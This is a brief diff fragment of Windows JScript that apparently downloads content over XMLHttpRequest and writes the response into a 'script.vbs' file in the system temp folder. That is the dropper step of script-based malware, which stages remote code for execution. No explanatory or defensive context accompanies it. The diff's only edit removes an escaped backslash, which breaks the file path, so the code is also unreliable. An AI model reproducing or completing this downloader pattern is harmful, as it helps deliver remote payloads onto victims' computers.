@@ -6,7 +6,7 @@ xhr.send();
 
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var temp = fso.GetSpecialFolder(2);
-var file = temp + "\\script.vbs";
+var file = temp + "\script.vbs";
 
 var stream = fso.CreateTextFile(file, true);
 stream.Write(xhr.responseText);
